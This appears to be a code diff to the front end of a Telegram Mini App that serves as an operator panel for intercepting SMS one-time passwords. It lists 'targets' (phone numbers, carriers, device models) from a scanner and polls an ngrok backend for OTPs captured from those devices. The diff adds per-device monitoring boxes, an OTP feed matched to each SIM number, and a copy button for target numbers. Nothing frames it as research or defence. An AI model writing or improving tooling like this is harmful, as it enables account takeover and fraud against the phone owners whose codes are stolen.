@@ -11,11 +11,38 @@
         .tab.active { background:#2ecc71; color:#000; }
         .panel { display:none; }
         .panel.active { display:block; }
-        .card { background:#1e1e1e; border-radius:10px; padding:12px; margin:8px 0; display:flex; justify-content:space-between; align-items:center; }
+
+        .card { background:#1e1e1e; border-radius:10px; padding:12px; margin:8px 0; }
+        .card-header { display:flex; justify-content:space-between; align-items:center; }
+        .monitor-box {
+            margin-top:10px;
+            padding:10px;
+            background:#2c3e50;
+            border-radius:8px;
+            display:none;
+        }
+        .monitor-box.active { display:block; }
+        .target-heading {
+            font-size:18px; font-weight:bold; margin-bottom:5px;
+            display:flex; align-items:center; gap:10px;
+        }
+        .copy-btn {
+            background:#3498db; color:#fff; border:none;
+            padding:4px 8px; border-radius:4px; cursor:pointer; font-size:12px;
+        }
+        .otp-area {
+            background:#111; min-height:60px; max-height:200px;
+            overflow-y:auto; padding:8px; border-radius:6px; margin:8px 0;
+        }
+        .otp-line {
+            background:#1a1a1a; padding:6px 8px; margin:4px 0;
+            border-radius:4px; font-size:13px;
+        }
         .btn { background:#2ecc71; color:#000; border:none; padding:8px 14px; border-radius:6px; font-weight:bold; cursor:pointer; }
         .btn.stop { background:#e74c3c; }
+        .btn.close { background:#95a5a6; color:#000; margin-top:5px; }
+        .fav-btn { background:#f39c12; }
         #feed { height:350px; overflow-y:auto; background:#111; border-radius:8px; padding:8px; }
-        .otp { background:#2c3e50; margin:5px 0; padding:8px; border-radius:5px; font-size:14px; }
         input, button { font-size:14px; }
     </style>
 </head>
@@ -28,11 +55,11 @@
 
     <div id="targets-panel" class="panel active">
         <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
-        <div id="targets-list"><p>Loading...</p></div>
+        <div id="targets-list"></div>
     </div>
     <div id="favourites-panel" class="panel">
         <button onclick="loadFavourites()">🔄 Refresh</button>
-        <div id="favourites-list"><p>Loading...</p></div>
+        <div id="favourites-list"></div>
     </div>
     <div id="feed-panel" class="panel">
         <div id="feed"><p>No OTPs yet...</p></div>
@@ -40,38 +67,30 @@
 
     <script>
         // ========== CONFIG ==========
-        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // apna ngrok URL (bina slash)
-        const tg = Telegram.WebApp;
-        tg.ready();
-
-        // 1. Try Telegram initData, fallback to URL parameter
+        const API = 'https://limit-crispness-uncork.ngrok-free.dev';
+        const tg = Telegram.WebApp; tg.ready();
         let userId = tg.initDataUnsafe?.user?.id || null;
         if (!userId) {
             const params = new URLSearchParams(window.location.search);
             userId = params.get('user_id');
         }
-
         if (!userId) {
             document.body.innerHTML = '<p style="color:red;">❌ Could not get user ID. Please open via bot.</p>';
             throw new Error('No user ID');
         }
 
-        let allTargets = [];
-        let monitorActive = false;
-        let pollTimer = null;
-        let lastOtpTs = 0;
-
-        console.log('Mini app started, userId:', userId);
-        console.log('API base:', API);
-
-        // Common header to skip ngrok warning
         const HEADERS = {
             'ngrok-skip-browser-warning': 'true',
             'Content-Type': 'application/json'
         };
+        let allTargets = [];
+        // Active monitors per device: did -> { active:bool, phone:string, lastTs:number }
+        let activeMonitors = {};
+        let globalPollInterval = null;
+        let globalLastOtpTs = 0;
 
-        // ----- Tab switching -----
-        window.switchTab = function(tab) {
+        // Tab switching
+        window.switchTab = (tab) => {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
             document.getElementById(tab+'-panel').classList.add('active');
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
@@ -83,93 +102,154 @@
         // ----- Targets -----
         async function loadTargets() {
             try {
-                console.log('Fetching targets...');
                 let res = await fetch(`${API}/api/targets`, { headers: HEADERS });
-                console.log('Response status:', res.status);
                 if (!res.ok) throw new Error('HTTP ' + res.status);
                 allTargets = await res.json();
-                console.log('Targets loaded:', allTargets.length);
                 renderTargets(allTargets);
             } catch(e) {
-                console.error('Load targets error:', e);
-                document.getElementById('targets-list').innerHTML = `<p style="color:red;">❌ Failed to load targets: ${e.message}</p>`;
+                document.getElementById('targets-list').innerHTML = '<p style="color:red;">Failed to load targets.</p>';
             }
         }
 
         function renderTargets(targets) {
-            let html = '';
-            if (targets.length === 0) {
-                html = '<p>No online targets. Scanner may be warming up.</p>';
-            } else {
-                targets.forEach(t => {
-                    let carrierInfo = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
-                    html += `<div class="card">
-                        <div><b>${t.phone1}</b>${carrierInfo}<br><small>${t.model} | DB-${t.db_index}</small></div>
-                        <button class="btn" onclick="startMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}')">▶️</button>
-                        <button class="btn" style="background:#f39c12;" onclick="addFavourite('${t.did}', '${t.phone1}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}', '${t.model}', ${t.db_index})">⭐</button>
-                    </div>`;
-                });
-            }
+            let html = targets.length ? '' : '<p>No online targets. Scanner may be warming up.</p>';
+            targets.forEach(t => {
+                let carrier = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
+                html += `
+                <div class="card" id="card-${t.did}">
+                    <div class="card-header">
+                        <div>
+                            <b>${t.phone1}</b>${carrier}<br>
+                            <small>${t.model} | DB-${t.db_index}</small>
+                        </div>
+                        <div>
+                            <button class="btn fav-btn" onclick="toggleFavourite('${t.did}')">⭐</button>
+                            <button class="btn" id="monitor-btn-${t.did}" onclick="toggleMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}')">▶️ MONITOR</button>
+                        </div>
+                    </div>
+                    <div class="monitor-box" id="monitor-box-${t.did}">
+                        <div class="target-heading">
+                            TARGET: ${t.phone1}
+                            <button class="copy-btn" onclick="copyText('${t.phone1}')">📋 Copy</button>
+                        </div>
+                        <div class="otp-area" id="otp-area-${t.did}"></div>
+                        <button class="btn close" onclick="closeMonitor('${t.did}')">✖ Close</button>
+                    </div>
+                </div>`;
+            });
             document.getElementById('targets-list').innerHTML = html;
+            // Restore any already active monitors
+            for (let did in activeMonitors) {
+                if (activeMonitors[did].active) {
+                    let box = document.getElementById('monitor-box-'+did);
+                    let btn = document.getElementById('monitor-btn-'+did);
+                    if (box && btn) {
+                        box.classList.add('active');
+                        btn.innerHTML = '⏹ STOP';
+                        btn.classList.add('stop');
+                    }
+                }
+            }
         }
 
         window.filterTargets = function() {
             let query = document.getElementById('search').value.toLowerCase();
-            let filtered = allTargets.filter(t => 
-                t.phone1.includes(query) || (t.phone2 && t.phone2.includes(query))
-            );
+            let filtered = allTargets.filter(t => t.phone1.includes(query));
             renderTargets(filtered);
         };
 
-        // ----- Monitoring -----
-        window.startMonitor = async function(did, dbIndex, phone1, model, phone2, car1, car2) {
-            if (monitorActive) {
+        // ----- Monitor Toggle -----
+        window.toggleMonitor = async function(did, dbIndex, phone, model) {
+            let monitor = activeMonitors[did];
+            let btn = document.getElementById('monitor-btn-'+did);
+            let box = document.getElementById('monitor-box-'+did);
+
+            if (!monitor || !monitor.active) {
+                // Start monitoring
                 await fetch(`${API}/api/monitor`, {
-                    method: 'DELETE',
-                    headers: HEADERS,
-                    body: JSON.stringify({user_id: userId})
+                    method: 'POST', headers: HEADERS,
+                    body: JSON.stringify({ user_id: userId, did, db_index: dbIndex, phone1: phone, model })
                 });
-            }
-            await fetch(`${API}/api/monitor`, {
-                method: 'POST',
-                headers: HEADERS,
-                body: JSON.stringify({
-                    user_id: userId,
-                    did: did,
-                    db_index: dbIndex,
-                    phone1: phone1,
-                    model: model,
-                    phone2: phone2,
-                    carrier1: car1,
-                    carrier2: car2
-                })
-            });
-            monitorActive = true;
-            tg.showAlert(`Monitoring ${phone1}`);
-            if (!pollTimer) {
-                pollOTP();
-                pollTimer = setInterval(pollOTP, 3000);
+                activeMonitors[did] = { active: true, phone: phone, lastTs: 0 };
+                if (btn) {
+                    btn.innerHTML = '⏹ STOP';
+                    btn.classList.add('stop');
+                }
+                if (box) box.classList.add('active');
+                startGlobalPolling();
+            } else {
+                // Stop monitoring
+                await fetch(`${API}/api/monitor`, {
+                    method: 'DELETE', headers: HEADERS,
+                    body: JSON.stringify({ user_id: userId, did })
+                });
+                activeMonitors[did].active = false;
+                if (btn) {
+                    btn.innerHTML = '▶️ MONITOR';
+                    btn.classList.remove('stop');
+                }
+                // Keep box open, just stop updating (user can close manually)
             }
         };
 
-        // ----- OTP Polling -----
-        async function pollOTP() {
-            try {
-                let res = await fetch(`${API}/api/otp/${userId}?since=${lastOtpTs}`, { headers: HEADERS });
-                if (!res.ok) return;
-                let msgs = await res.json();
-                if (msgs.length) {
-                    let feed = document.getElementById('feed');
-                    msgs.forEach(m => {
-                        feed.innerHTML += `<div class="otp">${m.text}</div>`;
-                        lastOtpTs = m.ts || lastOtpTs;
-                    });
-                    feed.scrollTop = feed.scrollHeight;
+        // Close box completely
+        window.closeMonitor = async function(did) {
+            if (activeMonitors[did]?.active) {
+                await fetch(`${API}/api/monitor`, {
+                    method: 'DELETE', headers: HEADERS,
+                    body: JSON.stringify({ user_id: userId, did })
+                });
+            }
+            delete activeMonitors[did];
+            let box = document.getElementById('monitor-box-'+did);
+            let btn = document.getElementById('monitor-btn-'+did);
+            if (box) box.classList.remove('active');
+            if (btn) {
+                btn.innerHTML = '▶️ MONITOR';
+                btn.classList.remove('stop');
+            }
+            document.getElementById('otp-area-'+did).innerHTML = '';
+        };
+
+        // ----- Global OTP Polling (runs when any monitor active) -----
+        function startGlobalPolling() {
+            if (globalPollInterval) return;
+            globalPollInterval = setInterval(async () => {
+                let activeIds = Object.keys(activeMonitors).filter(did => activeMonitors[did].active);
+                if (activeIds.length === 0) {
+                    clearInterval(globalPollInterval);
+                    globalPollInterval = null;
+                    return;
                 }
-            } catch(e) { console.error('OTP poll error:', e); }
+                try {
+                    let res = await fetch(`${API}/api/otp/${userId}?since=${globalLastOtpTs}`, { headers: HEADERS });
+                    if (!res.ok) return;
+                    let msgs = await res.json();
+                    if (msgs.length) {
+                        globalLastOtpTs = msgs[msgs.length-1].ts;
+                        msgs.forEach(m => {
+                            // Match phone number in formatted SMS
+                            let match = m.text.match(/📟 \*\*SIM:\*\* `(\d+)`/);
+                            if (match) {
+                                let phone = match[1];
+                                for (let did in activeMonitors) {
+                                    if (activeMonitors[did].active && activeMonitors[did].phone === phone) {
+                                        let area = document.getElementById('otp-area-'+did);
+                                        if (area) {
+                                            area.innerHTML += `<div class="otp-line">${m.text}</div>`;
+                                            area.scrollTop = area.scrollHeight;
+                                        }
+                                        break;
+                                    }
+                                }
+                            }
+                        });
+                    }
+                } catch(e) {}
+            }, 3000);
         }
 
-        // ----- Favourites -----
+        // ----- Favourites (simplified, keep existing) -----
         async function loadFavourites() {
             try {
                 let res = await fetch(`${API}/api/favourites/${userId}`, { headers: HEADERS });
@@ -181,34 +261,39 @@
                     favs.forEach(f => {
                         html += `<div class="card">
                             <div><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
-                            <button class="btn" onclick="startMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️</button>
-                            <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
+                            <div>
+                                <button class="btn" onclick="toggleMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️ MONITOR</button>
+                                <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
+                            </div>
                         </div>`;
                     });
                 }
                 document.getElementById('favourites-list').innerHTML = html;
             } catch(e) {
-                document.getElementById('favourites-list').innerHTML = `<p style="color:red;">Error loading favourites.</p>`;
+                document.getElementById('favourites-list').innerHTML = '<p style="color:red;">Error loading favourites.</p>';
             }
         }
 
         window.addFavourite = async function(did, phone1, phone2, car1, car2, model, dbIndex) {
             await fetch(`${API}/api/favourites/${userId}`, {
-                method: 'POST',
-                headers: HEADERS,
-                body: JSON.stringify({ did, phone1, phone2, carrier1: car1, carrier2: car2, model, db_index: dbIndex })
+                method: 'POST', headers: HEADERS,
+                body: JSON.stringify({ did, phone1, phone2, carrier1:car1, carrier2:car2, model, db_index:dbIndex })
             });
             tg.showAlert('Added to favourites');
         };
 
         window.removeFavourite = async function(did) {
             await fetch(`${API}/api/favourites/${userId}`, {
-                method: 'DELETE',
-                headers: HEADERS,
+                method: 'DELETE', headers: HEADERS,
                 body: JSON.stringify({ did })
             });
             loadFavourites();
         };
+
+        // Copy helper
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => tg.showAlert('Copied!'));
+        }
 
         // Initial load
         loadTargets();
